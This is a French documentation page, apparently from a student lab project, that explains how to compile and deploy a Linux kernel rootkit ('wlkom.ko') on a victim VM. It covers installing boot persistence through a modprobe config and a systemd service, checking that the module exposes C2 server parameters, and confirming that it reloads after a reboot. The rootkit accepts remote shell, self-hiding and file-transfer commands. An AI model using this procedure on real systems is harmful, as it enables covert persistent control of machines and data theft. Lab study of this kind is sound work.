# Déployer le rootkit

!!! question "Pourquoi ces choix ?"
    Voir [Persistance](../decisions/persistence.md).

La compilation et le déploiement se font **sur la VM Victime**. `make persistence` compile `wlkom.ko` et l'installe avec la persistance en une seule commande.

---

## Prérequis

Depuis la machine hôte, copier les sources dans vmshare :

```bash
cp -r rootkit/ vmshare/
```

Se connecter à la VM Victime :

```bash
ssh -p 10022 epita@localhost
```

---

## Compiler et installer

`make persistence` compile `wlkom.ko`, installe la persistance et démarre le service :

```bash
cd /mnt/vmshare/rootkit
make persistence
```

Le script demande le mot de passe (l'écho est désactivé) :

```
WLKOM password:
```

Puis affiche la progression :

```
WLKOM persistence installed for kernel 6.1.0-48-amd64.
Module: /lib/modules/6.1.0-48-amd64/extra/wlkom.ko
Config: /etc/modprobe.d/wlkom.conf
Service: /etc/systemd/system/wlkom.service
Start now with: sudo systemctl start wlkom.service
```

`make persistence` enchaîne ensuite automatiquement avec `make restart` (`sudo systemctl restart wlkom.service`) — le service est actif sans intervention supplémentaire.

Une fois chargé, le module accepte les commandes C2 pour l'exécution de shell, le masquage du module et les transferts de fichiers (`DOWNLOAD` et `UPLOAD`).

---

## Vérifier le déploiement

Vérifier que le module est bien construit :

```bash
sudo modinfo wlkom.ko
```

```
filename:       /mnt/vmshare/rootkit/wlkom.ko
author:         NMT
description:    WLKOM - Wild Linux Kernel Object Module
license:        GPL
depends:
retpoline:      Y
name:           wlkom
vermagic:       6.1.0-48-amd64 SMP preempt mod_unload modversions
parm:           password_hash:FNV-1a password hash (required at insmod) (charp)
parm:           c2_ip:C2 server IPv4 address (charp)
parm:           c2_port:C2 server TCP port (int)
```

La ligne `vermagic` doit correspondre à `uname -r` sur la victime — c'est ce qui garantit la compatibilité.

Vérifier que le service est actif :

```bash
sudo systemctl status wlkom.service
```

Sortie attendue :

```
● wlkom.service - WLKOM kernel module
     Loaded: loaded (/etc/systemd/system/wlkom.service; enabled; preset: enabled)
     Active: active (exited) since ...
    Process: ... ExecStart=/sbin/modprobe wlkom (code=exited, status=0/SUCCESS)
   Main PID: ... (code=exited, status=0/SUCCESS)
```

!!! note "Si le C2 n'est pas encore lancé"
    Le module se charge quand même et retente la connexion toutes les 5 secondes.

    Dans la fenêtre QEMU de la victime :

    ```
    wlkom: loaded
    wlkom: C2 unreachable (-111), retry in 5s
    wlkom: C2 unreachable (-111), retry in 5s
    ```

    Lancez le C2 quand vous êtes prêt, la connexion s'établit automatiquement.

---

## Tester après un reboot

Sur la VM Victime :

```bash
sudo reboot
```

Après reconnexion SSH, vérifier que le module s'est rechargé automatiquement :

```bash
lsmod | grep wlkom
sudo systemctl status wlkom.service
```

---

!!! success "Vérification"
    Avant de passer à l'étape suivante :

    - [x] `make persistence` s'exécute sans erreur
    - [x] `modinfo wlkom.ko` affiche les trois paramètres et un `vermagic` cohérent avec `uname -r`
    - [x] `sudo systemctl status wlkom.service` → `active (exited)`, `enabled`
    - [x] Après `sudo reboot` : le module se recharge automatiquement
